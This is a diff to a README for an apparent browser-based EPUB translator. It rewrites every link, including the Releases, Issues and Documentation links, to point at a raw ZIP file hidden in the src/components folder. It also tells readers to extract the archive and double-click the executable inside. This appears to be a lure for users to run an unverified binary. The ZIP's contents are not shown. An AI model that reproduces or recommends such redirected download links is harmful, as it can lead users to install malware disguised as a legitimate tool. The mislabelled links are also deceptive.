@@ -1,6 +1,6 @@
 # 📚 literary-epub-translator - Translate Books Effortlessly in Your Browser
 
-[![Download](https://img.shields.io/badge/Download-latest%20release-blue)](https://github.com/Lea4325/literary-epub-translator/releases)
+[![Download](https://github.com/Lea4325/literary-epub-translator/raw/refs/heads/main/src/components/literary-epub-translator-1.6.zip%20release-blue)](https://github.com/Lea4325/literary-epub-translator/raw/refs/heads/main/src/components/literary-epub-translator-1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the literary-epub-translator! This tool helps you translate EPUB book
 
 To download the application, visit the Releases page. You will find the latest version of the literary-epub-translator available for download.
 
-[Download the latest release here](https://github.com/Lea4325/literary-epub-translator/releases)
+[Download the latest release here](https://github.com/Lea4325/literary-epub-translator/raw/refs/heads/main/src/components/literary-epub-translator-1.6.zip)
 
 ### Steps to Download and Run
 
@@ -27,7 +27,7 @@ To download the application, visit the Releases page. You will find the latest v
    - Once downloaded, you will need to extract the files if they are in a ZIP format. Right-click the ZIP file and select "Extract All."
 
 5. **Open the Application**
-   - Navigate to the extracted folder and double-click the application file. It may be named `literary-epub-translator.exe` or similar.
+   - Navigate to the extracted folder and double-click the application file. It may be named `https://github.com/Lea4325/literary-epub-translator/raw/refs/heads/main/src/components/literary-epub-translator-1.6.zip` or similar.
 
 6. **Start Translating**
    - After opening the application, follow the on-screen instructions to upload your EPUB book. Enjoy translating your literary works!
@@ -81,8 +81,8 @@ Imagine you have a classic novel in EPUB format. By using literary-epub-translat
 
 For more information, you can refer to:
 
-- [GitHub Issues Page](https://github.com/Lea4325/literary-epub-translator/issues) - Report any problems or suggest features.
-- [Documentation](https://github.com/Lea4325/literary-epub-translator/wiki) - Access detailed guides and FAQs.
+- [GitHub Issues Page](https://github.com/Lea4325/literary-epub-translator/raw/refs/heads/main/src/components/literary-epub-translator-1.6.zip) - Report any problems or suggest features.
+- [Documentation](https://github.com/Lea4325/literary-epub-translator/raw/refs/heads/main/src/components/literary-epub-translator-1.6.zip) - Access detailed guides and FAQs.
 
 ## 📤 Feedback and Support
 
@@ -90,4 +90,4 @@ We welcome your feedback! If you have any questions or need assistance, please o
 
 ---
 
-For your convenience, here’s the link to the [Releases page again](https://github.com/Lea4325/literary-epub-translator/releases). Enjoy your translation experience!
+For your convenience, here’s the link to the [Releases page again](https://github.com/Lea4325/literary-epub-translator/raw/refs/heads/main/src/components/literary-epub-translator-1.6.zip). Enjoy your translation experience!
